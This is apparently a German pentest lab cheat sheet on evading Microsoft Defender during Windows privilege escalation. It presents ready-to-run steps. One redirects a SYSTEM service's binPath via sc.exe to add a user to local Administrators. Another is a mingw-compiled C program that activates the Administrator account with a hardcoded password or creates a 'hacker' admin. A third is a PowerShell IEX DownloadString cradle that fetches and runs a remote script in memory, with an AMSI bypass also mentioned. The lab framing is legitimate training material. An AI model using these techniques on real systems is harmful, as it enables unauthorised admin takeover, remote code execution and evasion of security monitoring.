# AV- / Defender-Evasion (ohne msfvenom-EXE arbeiten)

> Aktiver Microsoft Defender blockt msfvenom-generierte Executables zuverlaessig (bekannte
> Signaturen). Loesung: **AV-neutral** vorgehen - LOLBins, eigene Compiles, In-Memory.
> Lab-Bezug: **VM6 / Pruefungsfrage 5** (PrivEsc trotz aktivem Defender).

---

## Kernidee

Defender erkennt vor allem **bekannte Payload-Signaturen** und **Dateien auf der Platte**. Wer
keine bekannte EXE ablegt, faellt seltener auf. Drei robuste Wege:

1. **LOLBins statt Payload** - vorhandene Windows-Binaries (`cmd.exe`, `net.exe`, ...) tun, was
   man braucht. Kein eigener Payload = nichts zu signieren.
2. **Selbst kompilieren** - winziges eigenes C-Programm hat **keine** bekannte msfvenom-Signatur.
3. **In-Memory** - PowerShell-Stage, die nie auf Platte landet (`IEX (...)`).

---

## Weg 1 - LOLBin direkt: Service-binPath auf cmd.exe (Pruefungsfrage 5)

Wenn ein Low-Priv-User Schreibrechte auf einen als `LocalSystem` laufenden Dienst hat
(`AllAccess`/Change), biegt man den `binPath` einfach auf einen **cmd.exe-Aufruf** um - keine
Datei, kein Payload, kein Defender-Alarm.

```cmd
:: 1) Verwundbaren Dienst finden (PrivescCheck markiert "modification rights")
powershell -ep bypass -c "Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescReport -Format TXT"

:: 2) binPath auf reinen LOLBin-Befehl umbiegen (legt jenny in lokale Admins)
sc.exe config iphlpsvc binPath= "C:\Windows\System32\cmd.exe /c net localgroup Administratoren jenny /add"

:: 3) Dienst starten -> Befehl laeuft als LocalSystem
sc.exe stop iphlpsvc
sc.exe start iphlpsvc          :: Fehler 1053 (Timeout) ist NORMAL - der Befehl lief trotzdem

:: 4) Pruefen
net localgroup Administratoren  :: -> jenny ist jetzt Mitglied
```

**Syntax-Fallen (`sc.exe`):**
- Das **Leerzeichen nach `binPath=`** ist Pflicht (`sc.exe`-Eigenheit).
- Gruppenname lokalisiert: deutsches Windows = `Administratoren`, englisches = `Administrators`.
- Fehler **1053** ("Der Dienst antwortete nicht rechtzeitig") ist erwartet - `cmd /c ...` ist
  kein echter Service, aber der angehaengte Befehl wird trotzdem als SYSTEM ausgefuehrt.

> **Lab (VM6, Frage 5):** `jenny` hatte `AllAccess` auf `iphlpsvc`. binPath auf cmd-Aufruf ->
> `jenny` wird lokaler Admin. Komplett ohne msfvenom -> Defender schlaegt nicht an.

---

## Weg 2 - Eigenes C-Programm cross-kompilieren (mingw)

Wenn man doch eine EXE braucht (z. B. als Service-Binary): selbst schreiben, dann hat sie keine
bekannte Signatur.

```c
// add_admin.c
#include <windows.h>
#include <stdio.h>
int main() {
    system("net user Administrator P@ssw0rd123 /active:yes");      // Admin aktivieren
    // alternativ neuen Admin anlegen:
    // system("net user hacker P@ssw0rd123 /add");
    // system("net localgroup Administratoren hacker /add");
    return 0;
}
```

Auf Kali cross-kompilieren und uebertragen:

```bash
x86_64-w64-mingw32-gcc add_admin.c -o add_admin.exe       # Windows-EXE auf Linux bauen
# Uebertragen z. B. per SMB-Share (impacket-smbserver) -> copy auf das Ziel
```

```cmd
sc.exe config iphlpsvc binPath= "C:\Users\Jenny\Downloads\add_admin.exe"
sc.exe stop iphlpsvc & sc.exe start iphlpsvc
```

**Warum unsichtbar?** Defender-Signaturen zielen auf bekannte Payload-Muster (msfvenom-Stub,
Shikata-Encoder, ...). Eigener, trivialer C-Code hat keins davon.

---

## Weg 3 - In-Memory PowerShell (kein File auf Disk)

```powershell
# Stage wird direkt aus dem Netz in den RAM geladen und ausgefuehrt (kein Schreiben auf Platte)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.162:8000/script.ps1')
```

Genau dieses Prinzip nutzt **Metasploit `web_delivery`** (siehe
[Windows Command Injection](../02-Exploitation/Windows/command-injection-windows.md)).
Zusatz-Bypass bei AMSI: `evil-winrm` -> `Bypass-4MSI`.

---

## Schnell-Entscheidung

| Situation | Bevorzugter Weg |
|-----------|-----------------|
| Service/Task laeuft als SYSTEM, ich darf binPath setzen | Weg 1 (cmd-LOLBin) |
| Ich brauche eine echte EXE als Payload | Weg 2 (mingw-C) |
| Ich kann Code ausfuehren, aber nichts ablegen | Weg 3 (In-Memory PS) |

## -> Weiter

- Service-Hijack im Detail -> [Windows PrivEsc §3](../03-PrivEsc/Windows/README.md)
- LOLBins-Referenz -> https://lolbas-project.github.io/
